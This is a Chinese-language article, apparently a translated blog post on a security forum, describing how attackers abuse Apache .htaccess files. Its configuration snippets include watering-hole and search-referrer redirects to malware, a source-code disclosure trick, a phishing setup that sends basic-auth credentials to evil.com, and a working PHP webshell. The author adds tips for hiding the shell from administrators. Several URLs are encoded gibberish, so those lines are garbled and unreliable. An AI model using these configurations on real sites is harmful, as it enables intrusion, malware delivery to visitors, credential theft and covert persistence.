
如果出于某种原因，即使禁用拒绝规则（例如，由于`HTTP`守护进程或`CMS`特定配置文件的外部配置），也不允许访问`htaccess`，攻击者可以改用`AddType`设置一个更“无辜的”文件，如将一个`JPG`视为一个`PHP`文件。然后，可以在`JPG`图像中包含一些恶意`PHP`代码，上传图像，并导航到图像存储路径，以便执行代码。

如果攻击者利用`Windows 8.3`（`SFN`）文件名惯例的过时系统，则有可能规避基于黑名单的过滤器，该过滤器正在停止上传名为“`htaccess`”的文件。`.htaccess`的简称可以用在这种情况下。一个攻击者可以上传一个名为“`HTACCE〜1`”的文件，如果`8.3`文件名惯例正在使用，那么这将等于上传一个名为“.htaccess”的文件 - 假设这些文件名惯例正在使用中（现在不太常见），这可以用于绕过基于签名的过滤器和用于文件上传功能的黑名单。

## 水坑攻击以及利用恶意软件感染大量用户

如果攻击者设法攻击一个网站并且具有有限的（非根）访问权限，但是仍然能够对`htaccess`进行修改，那么这可以使用方法进行渗透利用。我将要介绍的第一个例子是攻击者可以修改`htaccess`来作为一个实际的水坑攻击。

如果攻击者有一个他们想要的攻击的特定目标，他们知道该 用户的`IP地址`，以及用户经常浏览的网站，如果攻击者有能力编辑或覆盖`htaccess`文件的受害者经常访问的网站,就可以发动水坑攻击（通过部分访问或通过任意文件上传的方式覆盖当前`htaccess`文件的能力）。让我们假设攻击者有一个目标，并知道他们的`IP地址`是`151.121.2.69`，他们经常访问一个名为`example.com`的网站 - 如果攻击者发现一个方法来覆盖`example.com`的`htaccess`文件，那么他们可以像这样设置一个`htaccess`规则：

```
RewriteCond %{REMOTE_ADDR} ^151\.\121\.2\.69$

RewriteCond %{REQUEST_URI} !/GetHacked.php

RewriteRule .*\.(htm|html|php)$ /GetHacked.php [R,L]

```

通过上面的例子，任何访问`example.com`的普通用户都可以正常浏览网站。如果受害者访问`example.com`，他们将被重定向到`GetHacked.php`（当然实际上比这个更加隐蔽，这里只是一个例子）。一般来说，受害者将被重定向到的页面看起来与他们打算在设计方面连接到的站点完全相同（并且将具有相同的域名），但是他们将被重定向到网站上单独的，独特的页面，然后这个网站会提供恶意软件，`hook`用户的浏览器，或者通过零日漏洞利用他们的浏览器。如果一切顺利，受害者完全不会意识到任何异常事情的发生。他们将像往常一样继续浏览网站，不知道他们已经成为水坑攻击的受害者。如果计划得当，这可能会导致一个高度复杂的，有针对性的对某人的袭击，并且用户完全不知道发生了什么事情。

虽然我刚刚描述的方法是针对特定受害者的有针对性的漏洞攻击，也可以通过一系列的重写规则，向网站的用户群提供恶意软件。这通常是通过检查引用者头部来查看用户来自哪个站点，并基于此将其重定向到恶意软件来实现的。通常，想要传播恶意软件的攻击者可以获取一个受欢迎的网站的权限，然后为`htaccess`创建一些重写规则，从而使任何来自流行搜索引擎访问该网站的人都被重定向到恶意软件或浏览器漏洞利用。这可以这样实现：

```
RewriteEngine On

RewriteCond %{HTTP_REFERER} .*google.* [OR]

RewriteCond %{HTTP_REFERER} .*ask.* [OR]

RewriteCond %{HTTP_REFERER} .*bing.* [OR]

RewriteCond %{HTTP_REFERER} .*aol.* [OR]

RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]

RewriteCond %{HTTP_REFERER} .*duckduckgo.* [OR]

RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]

RewriteCond %{HTTP_REFERER} .*baidu.*

RewriteRule ^(.*)$ 650K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2$3K9h3I4Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5h3I4%4j5i4u0W2i4K6u0W2k6i4S2@1 [R=301,L]

```

恶意黑客除了攻击网站并修改易受攻击的网站的`htaccess`文件以传播恶意软件或构建僵尸网络之外，此技术的另一个常见应用是将流量推送到支付流量的网站。如果一个黑客想侵入一些流行的网站并修改他们的`htaccess`文件来设置重定向规则，那么他们可以使得从搜索引擎到达的所有访问者都被重定向到黑客选择的站点。这是在黑客社区赚钱的一种流行方式，因为许多网站将流量推送到他们的域名，黑客通过修改排名靠前的`Alexa`或`Google PR`排名的网站的`htaccess`文件的方式，将大量的流量转换成高额的报酬。

另外需要注意的是，通过在你自己的网站上使用`htaccess`规则，也可以作为一个防御机制。例如，想象一下你目前正在运营一个网站，并且您知道在线黑客论坛的用户正在尝试定位您的网站，那么你可以设置`htaccess`规则，以便任何从恶意网站直接进入您网站的人都被重定向到恶意软件，并在有机会造成任何损害之前先行反击。如果你知道来自`evil-site.com`的人正试图定位你的网站，那么你可以设置一个`htaccess`规则，如下所示：

```
RewriteEngine On

RewriteCond %{HTTP_REFERER} .*evil-site.com

RewriteRule ^(.*)$ 85bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3S2S2j5$3E0Q4x3X3c8@1K9r3g2Q4x3X3c8Z5j5h3y4C8k6i4u0K6i4K6u0W2j5$3!0E0i4K6u0r3L8h3q4D9N6$3q4J5k6g2)9J5k6h3g2^5N6l9`.`. [R=301,L]

```

除了上述用恶意软件感染站点用户的方法之外，通过使用错误页面也可以实现类似的事情。 您可以添加`htaccess`规则，以便在触发常见的`HTTP`状态码错误时将用户重定向到恶意软件：

```
ErrorDocument 403 922K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2$3K9h3I4Q4x3X3g2U0L8$3#2Q4x3V1k6H3j5i4W2D9L8$3q4V1i4K6u0W2M7r3S2H3

ErrorDocument 404 386K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2$3K9h3I4Q4x3X3g2U0L8$3#2Q4x3V1k6H3j5i4W2D9L8$3q4V1i4K6u0W2M7r3S2H3

ErrorDocument 500 4a3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2$3K9h3I4Q4x3X3g2U0L8$3#2Q4x3V1k6H3j5i4W2D9L8$3q4V1i4K6u0W2M7r3S2H3

```

## 通过`htaccess`进行信息泄露：

通过`htaccess`文件有两种主要的信息泄露形式。 一种需要访问受感染的服务器，另一种不需要。

由于服务器配置错误或缺少默认的拒绝规则，有时`htaccess`文件可以被任何人读取。 进行渗透测试时，检查`htaccess`是否可读是非常有用的（10次中有9次不会），所以你可以看到哪些重写规则以及其他限制或设置。 你会惊讶的发现信息可以被泄露，你会惊讶于你会经常遇到不能正确配置他们的服务器或`HTTP 403`的`htaccess`文件。如下：

![谷歌索引的大多数网站都有可读的.htaccess文件](https://bbs.kanxue.com/upload/attach/201711/740325_e6z33fg5qpossar.png)

谷歌索引的大多数网站都有可读的.htaccess文件

检查你是否可以在正在执行审核的网站上对.htaccess文件进行读操作是十分有用的。 要执行此操作，只需导航到你正在测试的网站上的以下`URL`：

```
b8eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6Q4x3X3g2Z5N6r3q4U0j5$3g2K6M7H3`.`.
```

通常情况下，你将收到一个`HTTP 403`响应，但在某些情况下，你将有权限读取`.htaccess`。还值得指出的是，该文件可能并不一定是被命名为`.htaccess`，有几个常见的变化需要注意:

- `OLD.htaccess`
- `1.htaccess`
- `dot.htaccess`
- `backup.htaccess`
- `_.htaccess`
- `-.htaccess`

除此之外，`htaccess`将成为特定`CMS`内的文本文件（一些例子是`Joomla`和`OpenCart`） - 所以根据服务器运行的`CMS`，有时候检查`htaccess.txt`是否可读十分有必要。 这里是一个例子（在`Joomla`安装）：

```
e7bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3&6S2N6r3W2G2L8X3q4D9j5%4u0A6L8h3g2S2k6$3g2F1j5%4W2Q4x3X3g2Y4L8%4k6Q4x3X3g2#2K9#2)9J5c8X3S2@1j5h3y4U0k6i4y4K6i4K6u0W2N6s2S2@1
```

![了解哪些.htaccess规则可以让攻击者知道相应的安全限制已经到位，哪些没有。 因此，这将使他们知道什么可能需要被绕过。 它还可以显示有关网站上运行的技术的信息。](https://bbs.kanxue.com/upload/attach/201711/740325_m1mrklm9u48k238.png)

通过`.htaccess`进行信息泄露的第二个版本便是在攻击者对服务器的访问受限的情况下进行的。 我们假设他们不能编辑文件或执行其他操作，但是他们可以编辑`.htaccess`（或者通过任意文件上传的方式来替换`htaccess`）。 除了绕过诸如`PHP`安全模式和产生`shell`之类的限制之外，它还可以用于在服务器上泄露信息以便进一步帮助攻击。 假设系统调用被禁用，并且滥用`htaccess`修改`php.ini`（以启用系统调用）的方法不起作用，那么信息泄露可能是攻击者的下一个行动过程。

假设你可以通过一个恶意的`htaccess`文件来执行`PHP`代码，那么通过`PHP`的功能就可以使用明显的信息泄露手段。 假设你没有执行系统调用的能力，但仍然可以执行`PHP`，那么最明显的信息披露形式就是通过使用`phpinfo`函数。 您将首先覆盖如前所述的拒绝规则，然后您将导航到`htaccess`所在的`URL`以显示`phpinfo`（显示你的`PHP`版本，内核版本和其他有用的信息）：

```
AddType application/x-httpd-php .htaccess

# <?php phpinfo(); ?>
```

另一种可能性（尽管`sysadmin`很容易检测到）是，您可以更改服务器端脚本的内容类型，从而允许攻击者读取`PHP`文件的源代码。这意味着他们将有能力在网站上执行源代码审计，使他们有可能发现更多的漏洞：

```
<FilesMatch “\.ph.*$”>

 SetHandler text/plain

 AddType text/plain .php

</FilesMatch>
```

如果攻击者的目标是隐藏自己，那么这可能不是最好的选择。这可以通过将`AddType text/plain filename.php`设置为他们希望查看源代码的特定文件的名称，从而达到隐蔽的目的。一次只做一个文件会大大降低系统管理员检测到某些事情发生的机会（如果他们网站上的每个页面泄露其源代码供任何人看到，那么他们就会明显感觉到错误）。假设攻击者具有有限的访问权限，并且缺少对`PHP`文件的读取权限，那么这可能是非常有价值的，因为这将使他们找到更多的关键漏洞，最终使他们能够提升权限并获得更高的访问级别。

还可以通过使用`SetHandler`指令和将以下几行添加到恶意`htaccess`文件中，从而披露 `server-status`和`server-info`：

```
SetHandler server-status

SetHandler server-info
```

这将泄漏关于服务器的有用信息，以及连接到服务器的所有用户的`IP地址`。 根据在目标网站上运行的技术，`SetHandler`还可以用于披露其他类型的信息（例如，有关`LDAP`配置的信息或诸如`caucho-status`之类的信息 - 这不会太常见，因为`java servlet`实际上总是通过`Tomcat`内的`Apache`而不是`Resin`来处理，但`Tomcat`和其他技术也有相应的功能）。

描述的用于执行浏览器指纹识别和`IP`记录用户的方法也可用于信息泄露。 `PHP`动态镜像可以与托管在你自己的服务器上的`htaccess`文件结合使用，然后攻击者可以将`URL`输入到目标服务器上某处的映像，从而导致目标服务器请求镜像和返回的目标服务器的`IP地址`写入攻击者服务器上的日志文件。 这可以用来绕过像`Cloudflare`这样的服务，以便揭示服务器的真实`IP地址`。

## 通过网上钓鱼获取登录凭据：

攻击者可以通过几种不同的方式使用`htaccess`来获取登录凭据和对用户实施钓鱼。 我在这里讨论的方法是通过使用`ErrorDocument`进行鱼叉式钓鱼 - 除了能够通过使用自定义错误文档来提供恶意软件外，还可以使用`HTML` / `CSS` / `JS`创建文档，这意味着某些人可以轻松创建`iframe` 网络钓鱼来获取证书，这就像：

```
ErrorDocument 403 <YourHtmlCode>
```

当用户到达`403`页（或者攻击者选择设置的任何`HTTP`状态码）时，他们可以通过使用`iframe`或`document.write()`来创建假登录页面，诱骗用户的凭证。

另一种通过在受损站点上修改`htaccess`来进行网络钓鱼的方法是通过用户名/密码框提示用户，然后将输入的凭证发送到由攻击者控制的远程服务器，这里是由[`wireghoul`](https://bbs.kanxue.com/elink@f25K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6%4K9i4u0W2k6$3S2G2N6h3I4Q4x3V1k6Z5N6s2y4Z5k6h3I4D9M7H3`.`.) 创建的`htaccess`文件，便做到这一点：

```
＃此文件将提示用户输入用户名和密码以明文形式（http basic auth）将证书发送到您的服务器

＃你将需要编辑这个文件并创建一个脚本来收集服务器上的凭据

AuthType Basic

AuthName “”

AuthRemoteServer evil.com

AuthRemotePort 80

AuthRemoteURL /phish/

require valid-user

＃您的脚本需要返回相应的401或200 OK响应代码到mod_auth_remote模块。
```

在这个博客系列的第`2`部分中，我将解释一些利用`htaccess`的独特和复杂的网络钓鱼方法，这几乎是无法察觉的。

## 使用`htaccess`来产生一个`shell`：

如果攻击者对他们试图锁定的服务器的访问权限有限，或者是一个允许他们覆盖当前存在的`htaccess`文件的漏洞，那么可以使用前面描述的方法将`htaccess`变成一个基于`web`的`HTTP GET shell`。有时即使攻击者已经拥有对服务器的`shell`访问权限，但是为了维护对其原始`shell`的访问权限，防止被检测和删除，他们可能需要向`htaccess`添加额外的`shell`。

下面是一个功能齐全的产生`shell`的`htaccess`文件的例子：

```
＃htaccess后门shell

＃这是比较典型的webshell相对隐身

＃覆盖拒绝规则，使htaccess可以从互联网上访问，没有这个，你会得到一个HTTP 403

<Files ~ “^\.ht”>

 Require all granted

 Order allow,deny

 Allow from all

</Files>

＃使服务器将.htaccess文件作为.php文件

AddType application/x-httpd-php .htaccess

# <?php system($_GET[‘hax’]); ?>
＃要执行您将导航到的命令：
# 6daK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6#2L8r3&6W2M7X3q4T1L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6Q4x3X3g2Z5N6r3q4U0j5$3g2K6M7#2)9K6c8X3S2S2P5q4)9K6c8q4W2G2N6i4u0o6L8$3#2E0j5h3&6V1
＃如果system不能使用，然后尝试其他系统调用，例如passthru(); shell_exec();等等
＃如果你仍然不能执行系统调用，请尝试通过htaccess绕过php.ini
```

一般来说，如果攻击者使用`htaccess`作为维护`shell`访问受感染站点的手段，那么他们会在`htaccess`文件中添加某种形式的填充/空格或附加（无害）指令，使其长度更长，以至于系统管理员可能会注意到他们的`htaccess`文件中存在的任何可疑的`PHP`代码。对于更加隐蔽的`htaccess shell`，我建议将非字母数字组合放入您的`PHP`代码中（我将在即将发布的博客文章中介绍有关维护访问受损服务器方法的非字母数字主题）。

另外，对于在`PHP`不可用的情况下可以在`htaccess`中使用的各种形式的`shell`的完整列表，我强烈建议查看`wireghoul`的“`htshells`”存储库。

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
